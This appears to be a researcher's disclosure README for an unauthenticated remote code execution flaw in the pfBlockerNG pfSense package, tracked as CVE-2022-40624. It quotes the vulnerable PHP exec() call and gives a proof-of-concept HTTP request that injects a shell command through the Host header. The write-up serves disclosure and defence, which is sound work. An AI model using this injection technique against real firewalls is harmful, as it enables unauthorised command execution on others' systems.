# pfBlockerNg-CVE-2022-40624

# Background
pfBlockerNG is the Next Generation of pfBlocker with the following features:
1. Manage IPv4/v6 List Sources into 'Deny, Permit or Match' formats.
2. GeoIP database by MaxMind Inc. (GeoLite2 Free version).
3. De-Duplication, Suppression, and Reputation enhancements.
4. Provision to download from diverse List formats.
5. Advanced Integration for Proofpoint ET IQRisk IP Reputation Threat Sources.
6. Domain Name (DNSBL) blocking via Unbound DNS Resolver. 

https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html


# Affected Versions
pfBlockerNg <2.1.4_27

# Vulnerability
Unauthenticated remote code execution (RCE)

The query for TLD Block section of `index.php` includes an unsanitized/unescaped user input `d_query` from the HEADER Host source into the PHP exec function sink.

`exec("/usr/bin/grep -l '^{$d_query}$' /var/db/pfblockerng/dnsblalias/DNSBL_TLD", $match);`

*/pfblockerng/www/index.php*
```
// Query for a TLD Block
if (empty($pfb_query)) {
	$idparts	= explode('.', $query);
	$idcnt		= (count($idparts) -1);

	for ($i=1; $i <= $idcnt; $i++) {
		$d_query = implode('.', array_slice($idparts, -$i, $i, TRUE));
		exec("/usr/bin/grep -l '^{$d_query}$' /var/db/pfblockerng/dnsblalias/DNSBL_TLD", $match);

		if (!empty($match[0])) {
			$pfb_query = 'DNSBL_TLD';
			break;
		}
	}
}
```

# Exploitation
Requires HTTP access to pfsense web console
Sample payload: `' *; sleep 5; '`

POC Request:
```
GET /pfblockerng/www/index.php HTTP/1.1
Host: test.test2' *; sleep 5; '
Content-Length: 2
```

# Inspiration
I love pfBlockerNg and was inspired by Di r00t's recent CVE-2022-31814 and great writeup https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/ and was curious to see if Snyk static application security test (SAST) tool would detect the vulnerability.  So I download the respecitive index.php version 2.1.4_26 file and ran Snyk Code against it.  Sure enough Snyk detected the vuln plus another similar reporting just a handful of lines later.
